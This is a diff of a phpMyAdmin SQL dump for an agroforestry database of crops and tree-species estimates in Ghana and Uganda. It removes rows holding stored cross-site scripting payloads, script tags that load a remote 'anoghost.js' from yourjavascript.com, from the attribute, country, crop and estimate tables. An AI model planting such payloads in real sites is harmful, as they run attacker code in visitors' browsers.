@@ -3,7 +3,7 @@
 -- https://www.phpmyadmin.net/
 --
 -- Host: 127.0.0.1
--- Generation Time: Jul 02, 2019 at 03:23 PM
+-- Generation Time: Jul 02, 2019 at 04:44 PM
 -- Server version: 10.1.38-MariaDB
 -- PHP Version: 7.3.3
 
@@ -39,10 +39,7 @@ CREATE TABLE `attributes` (
 --
 
 INSERT INTO `attributes` (`id_attribute`, `attribute`, `explanation`) VALUES
-(1, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>'),
-(3, 'Soil Erosion', 'Running water'),
-(5, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>'),
-(6, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>   <script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>   <script type=\"text/javascript\" src=\"http://yourjavascript', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>    <script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>   <script type=\"text/javascript\" src=\"http://yourjavascrip');
+(3, 'Soil Erosion', 'Running water');
 
 -- --------------------------------------------------------
 
@@ -457,8 +454,7 @@ INSERT INTO `country` (`id_country`, `country`) VALUES
 (29, 'Ghana'),
 (35, 'China'),
 (36, 'Laos'),
-(37, 'Vietnam'),
-(38, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>  <script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>  ');
+(37, 'Vietnam');
 
 -- --------------------------------------------------------
 
@@ -476,10 +472,8 @@ CREATE TABLE `crop` (
 --
 
 INSERT INTO `crop` (`id_crop`, `crop`) VALUES
-(1, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script> <script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script><script type=\"text/javascript\" src=\"http://yourjavascript.com/'),
 (3, 'Arabica'),
-(4, 'Cocoa'),
-(6, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script> <script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>  ');
+(4, 'Cocoa');
 
 -- --------------------------------------------------------
 
@@ -507,7 +501,6 @@ CREATE TABLE `estimate_stderror` (
 --
 
 INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
-(337, 'Ghana', 'West', 'Arabica', '2', 'Subgroup', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '0.000', '0.000'),
 (338, 'Ghana', 'West', 'Arabica', '2', 'High precipitation', 'blackpod disease', 'NULL', 'Akuako.ninsuo..Spathodea.campanulata.', 'NULL', '2.390', '0.390'),
 (339, 'Ghana', 'West', 'Arabica', '2', 'High precipitation', 'blackpod disease', 'NULL', 'Avocado.pear..Persea.americana.', 'NULL', '2.560', '0.210'),
 (340, 'Ghana', 'West', 'Arabica', '2', 'High precipitation', 'blackpod disease', 'NULL', 'Baku..Makore..Tieghemella.heckelli.', 'NULL', '3.740', '0.170'),
@@ -852,11 +845,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (679, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Funtum..Funtumia.elastica.', 'NULL', '1.960', '0.130'),
 (680, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Gliricidia..Gliricidia.sepium.', 'NULL', '2.520', '0.420'),
 (681, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Kruba..Krumben..Mahogany..Khaya.anthothca.', 'NULL', '3.750', '1.030'),
-(682, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Kyenkyen..Antiaris.toxicaria.', 'NULL', '3.030', '0.150');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(682, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Kyenkyen..Antiaris.toxicaria.', 'NULL', '3.030', '0.150'),
 (683, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Mahogany..Dubini..Khaya.ivorensis.', 'NULL', '4.710', '0.280'),
 (684, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Nyame.Dua..Alstonia.boonei.', 'NULL', '2.250', '0.150'),
-(685, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Odoma..Ficus.capensis.', 'NULL', '1.320', '0.220'),
+(685, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Odoma..Ficus.capensis.', 'NULL', '1.320', '0.220');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (686, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Odum..Milicia.excelsa.', 'NULL', '5.510', '0.260'),
 (687, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Odum.nua..Milicia.regia.', 'NULL', '2.300', '0.610'),
 (688, 'Ghana', 'West', 'Arabica', '3', 'Low precipitation', 'capsids', 'NULL', 'Odwuma..Musanga.cecropioides.', 'NULL', '0.710', '0.260'),
@@ -1211,11 +1204,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (1331, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'M.paradisiaca - Matooke', 'NULL', '2.140', '0.075'),
 (1332, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'P.americana - Vvakeddo', 'NULL', '1.570', '0.085'),
 (1333, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'P.carribea - Pines', 'NULL', '0.000', '0.346'),
-(1334, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'P.guajava - Mupeera', 'NULL', '1.040', '0.108');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(1334, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'P.guajava - Mupeera', 'NULL', '1.040', '0.108'),
 (1335, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'S.campanulata - Kifabakazi', 'NULL', '2.030', '0.147'),
 (1336, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'S.cuminii - Jambula', 'NULL', '1.580', '0.190'),
-(1337, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'S.spectabilis - Gasiya', 'NULL', '1.920', '0.318'),
+(1337, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'S.spectabilis - Gasiya', 'NULL', '1.920', '0.318');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (1338, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'leaf', 'NULL', 'V.apiculata - Matugunda', 'NULL', '2.850', '0.479'),
 (1339, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'litter', 'NULL', 'A.chinensis - Omugavu omuzungu', 'NULL', '4.170', '0.260'),
 (1340, 'Uganda', 'East', 'Arabica', '5', 'All precipitation zones', 'litter', 'NULL', 'A.coriaria - Mugavu', 'NULL', '4.170', '0.084'),
@@ -1585,11 +1578,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (1704, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'A.chinensis - Omugavu omuzungu', 'NULL', '7.100', '0.254'),
 (1705, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'A.coriaria - Mugavu', 'NULL', '11.550', '0.227'),
 (1706, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'A.heterophyllus - Ffene', 'NULL', '7.120', '0.104'),
-(1707, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'A.zygia - Nnongo', 'NULL', '7.670', '0.341');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(1707, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'A.zygia - Nnongo', 'NULL', '7.670', '0.341'),
 (1708, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'C.calothyrsus - Kaliyandula', 'NULL', '2.800', '0.690'),
 (1709, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'C.papaya - Mupapaali', 'NULL', '1.380', '0.653'),
-(1710, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'C.schweinfurthii - Muwafu', 'NULL', '8.920', '0.259'),
+(1710, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'C.schweinfurthii - Muwafu', 'NULL', '8.920', '0.259');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (1711, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'F.natalensis - Mutuba', 'NULL', '7.160', '0.104'),
 (1712, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'F.ovata - Mukokoowe', 'NULL', '7.820', '0.192'),
 (1713, 'Uganda', 'East', 'Arabica', '6', 'High precipitation', 'timber', 'NULL', 'M.eminii - Musizi', 'NULL', '10.510', '0.201'),
@@ -1969,11 +1962,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (2087, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'P.americana - Vvakeddo', 'NULL', '1.340', '0.084'),
 (2088, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'P.carribea - Pines', 'NULL', '0.000', '0.407'),
 (2089, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'P.guajava - Mupeera', 'NULL', '1.260', '0.102'),
-(2090, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'S.campanulata - Kifabakazi', 'NULL', '1.520', '0.133');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(2090, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'S.campanulata - Kifabakazi', 'NULL', '1.520', '0.133'),
 (2091, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'S.cuminii - Jambula', 'NULL', '1.110', '0.243'),
 (2092, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'S.spectabilis - Gasiya', 'NULL', '1.540', '0.340'),
-(2093, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'V.apiculata - Matugunda', 'NULL', '0.000', '0.000'),
+(2093, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'BCTB', 'NULL', 'V.apiculata - Matugunda', 'NULL', '0.000', '0.000');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (2094, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'firewood', 'NULL', 'A.chinensis - Omugavu omuzungu', 'NULL', '6.610', '0.282'),
 (2095, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'firewood', 'NULL', 'A.coriaria - Mugavu', 'NULL', '7.290', '0.107'),
 (2096, 'Uganda', 'East', 'Arabica', '8', 'Medium precipitation', 'firewood', 'NULL', 'A.heterophyllus - Ffene', 'NULL', '5.020', '0.089'),
@@ -2357,12 +2350,12 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (2474, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'F.albida', 'NULL', '1.150', '0.240'),
 (2475, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'F.mucosa', 'NULL', '4.370', '0.070'),
 (2476, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'F.natalensis', 'NULL', '3.350', '0.050'),
-(2477, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'F.ovata', 'NULL', '3.410', '0.050');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(2477, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'F.ovata', 'NULL', '3.410', '0.050'),
 (2478, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'F.sur', 'NULL', '3.450', '0.050'),
 (2479, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'F.sycomorus', 'NULL', '2.300', '0.180'),
 (2480, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'G.robusta', 'NULL', '1.750', '0.070'),
-(2481, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'J.mimosifolia', 'NULL', '1.680', '0.460'),
+(2481, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'J.mimosifolia', 'NULL', '1.680', '0.460');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (2482, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'M.excelsa', 'NULL', '2.140', '0.090'),
 (2483, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'M.indica', 'NULL', '2.000', '0.070'),
 (2484, 'Uganda', 'East', 'Arabica', '9', 'All altitudes', 'Mulch', 'NULL', 'M.lutea', 'NULL', '1.580', '0.080'),
@@ -2779,12 +2772,12 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (2895, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'G.robusta', 'NULL', '1.000', '0.160'),
 (2896, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'J.mimosifolia', 'NULL', '1.210', '0.450'),
 (2897, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'M.excelsa', 'NULL', '1.510', '0.110'),
-(2898, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'M.indica', 'NULL', '1.490', '0.100');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(2898, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'M.indica', 'NULL', '1.490', '0.100'),
 (2899, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'M.lutea', 'NULL', '0.600', '0.220'),
 (2900, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'M.paradisiaca', 'NULL', '0.810', '0.090'),
 (2901, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'P.americana', 'NULL', '0.880', '0.130'),
-(2902, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'P.guajava', 'NULL', '0.360', '0.210'),
+(2902, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'P.guajava', 'NULL', '0.360', '0.210');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (2903, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'R.caffra', 'NULL', '1.360', '0.130'),
 (2904, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'S.campanulata', 'NULL', '1.450', '0.090'),
 (2905, 'Uganda', 'East', 'Arabica', '11', 'Low altitude', 'Erosion', 'NULL', 'T.ivorensis', 'NULL', '1.130', '0.210'),
@@ -3202,11 +3195,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (4526, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'BCTB', 'NULL', 'V.apiculata - Matugunda', 'NULL', '0.000', '0.000'),
 (4527, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'A.chinensis - Omugavu omuzungu', 'NULL', '6.610', '0.282'),
 (4528, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'A.coriaria - Mugavu', 'NULL', '7.290', '0.107'),
-(4529, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'A.heterophyllus - Ffene', 'NULL', '5.020', '0.089');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(4529, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'A.heterophyllus - Ffene', 'NULL', '5.020', '0.089'),
 (4530, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'A.muricata - Kitafeeri', 'NULL', '3.020', '0.673'),
 (4531, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'A.zygia - Nnongo', 'NULL', '5.530', '0.259'),
-(4532, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'C.calothyrsus - Kaliyandula', 'NULL', '5.060', '0.312'),
+(4532, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'C.calothyrsus - Kaliyandula', 'NULL', '5.060', '0.312');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (4533, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'C.papaya - Mupapaali', 'NULL', '1.620', '0.464'),
 (4534, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'C.reticulata - Mangadda', 'NULL', '0.000', '0.000'),
 (4535, 'Uganda', 'East', 'Arabica', '14', 'All precipitation zones', 'firewood', 'NULL', 'C.schweinfurthii - Muwafu', 'NULL', '4.860', '0.353'),
@@ -3570,11 +3563,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (4893, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'F.natalensis - Mutuba', 'NULL', '5.580', '0.131'),
 (4894, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'F.ovata - Mukokoowe', 'NULL', '2.990', '0.162'),
 (4895, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'M.eminii - Musizi', 'NULL', '4.280', '0.117'),
-(4896, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'M.excelsa - Muvule', 'NULL', '1.620', '0.139');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(4896, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'M.excelsa - Muvule', 'NULL', '1.620', '0.139'),
 (4897, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'M.indica - Muyembe', 'NULL', '1.570', '0.104'),
 (4898, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'M.lutea - Musambya', 'NULL', '1.770', '0.113'),
-(4899, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'M.paradisiaca - Matooke', 'NULL', '3.610', '0.098'),
+(4899, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'M.paradisiaca - Matooke', 'NULL', '3.610', '0.098');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (4900, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'P.americana - Vvakeddo', 'NULL', '2.740', '0.093'),
 (4901, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'P.carribea - Pines', 'NULL', '0.000', '0.400'),
 (4902, 'Uganda', 'East', 'Arabica', '14', 'High precipitation', 'leaf', 'NULL', 'P.guajava - Mupeera', 'NULL', '1.700', '0.165'),
@@ -3950,11 +3943,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (5272, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'P.americana - Vvakeddo', 'NULL', '2.800', '0.093'),
 (5273, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'P.carribea - Pines', 'NULL', '0.620', '0.355'),
 (5274, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'P.guajava - Mupeera', 'NULL', '0.340', '0.152'),
-(5275, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'S.campanulata - Kifabakazi', 'NULL', '2.710', '0.161');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(5275, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'S.campanulata - Kifabakazi', 'NULL', '2.710', '0.161'),
 (5276, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'S.cuminii - Jambula', 'NULL', '2.350', '0.207'),
 (5277, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'S.spectabilis - Gasiya', 'NULL', '1.650', '0.375'),
-(5278, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'V.apiculata - Matugunda', 'NULL', '1.610', '0.559'),
+(5278, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'temperature', 'NULL', 'V.apiculata - Matugunda', 'NULL', '1.610', '0.559');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (5279, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'timber', 'NULL', 'A.chinensis - Omugavu omuzungu', 'NULL', '4.930', '0.312'),
 (5280, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'timber', 'NULL', 'A.coriaria - Mugavu', 'NULL', '8.230', '0.216'),
 (5281, 'Uganda', 'East', 'Arabica', '14', 'Low precipitation', 'timber', 'NULL', 'A.heterophyllus - Ffene', 'NULL', '4.020', '0.096'),
@@ -4325,11 +4318,11 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (5646, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'M.paradisiaca - Matooke', 'NULL', '3.790', '0.103'),
 (5647, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'P.americana - Vvakeddo', 'NULL', '1.880', '0.091'),
 (5648, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'P.carribea - Pines', 'NULL', '0.000', '0.391'),
-(5649, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'P.guajava - Mupeera', 'NULL', '1.670', '0.111');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(5649, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'P.guajava - Mupeera', 'NULL', '1.670', '0.111'),
 (5650, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'S.campanulata - Kifabakazi', 'NULL', '2.680', '0.163'),
 (5651, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'S.cuminii - Jambula', 'NULL', '1.680', '0.205'),
-(5652, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'S.spectabilis - Gasiya', 'NULL', '1.250', '0.346'),
+(5652, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'S.spectabilis - Gasiya', 'NULL', '1.250', '0.346');
+INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
 (5653, 'Uganda', 'East', 'Arabica', '14', 'Medium precipitation', 'yield', 'NULL', 'V.apiculata - Matugunda', 'NULL', '3.040', '0.524'),
 (5654, 'Uganda', 'East', 'Arabica', '15', 'Subgroup', 'Attribute_user', 'NULL', 'Tree_user', 'NULL', '0.000', '0.000'),
 (5655, 'Uganda', 'East', 'Arabica', '15', 'All altitudes', 'Erosion', 'NULL', 'A.coriaria', 'NULL', '2.360', '0.050'),
@@ -4744,12 +4737,12 @@ INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `Batch
 (6064, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Mulch', 'NULL', 'M.paradisiaca', 'NULL', '4.830', '0.070'),
 (6065, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Mulch', 'NULL', 'P.africana', 'NULL', '3.570', '0.220'),
 (6066, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Mulch', 'NULL', 'P.americana', 'NULL', '3.820', '0.100'),
-(6067, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Mulch', 'NULL', 'S.campanulata', 'NULL', '4.730', '0.080');
-INSERT INTO `estimate_stderror` (`id_score`, `country`, `region`, `crop`, `BatchID`, `subgroup`, `attribute_user`, `attribute_system`, `tree_user`, `tree_system`, `estimate`, `qStdError`) VALUES
+(6067, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Mulch', 'NULL', 'S.campanulata', 'NULL', '4.730', '0.080'),
 (6068, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Mulch', 'NULL', 'V.auriculifera', 'NULL', '3.280', '0.140'),
 (6069, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Soil moisture', 'NULL', 'A.coriaria', 'NULL', '1.920', '0.100'),
 (6070, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Soil moisture', 'NULL', 'A.heterophyllus', 'NULL', '1.330', '0.110'),
-(6071, 'Uganda', 'East', 'Arabica', '15', 'High altitude', 'Soil moisture', 'NULL', 'A.molucana', 'NULL', '1.120', '0.180'),
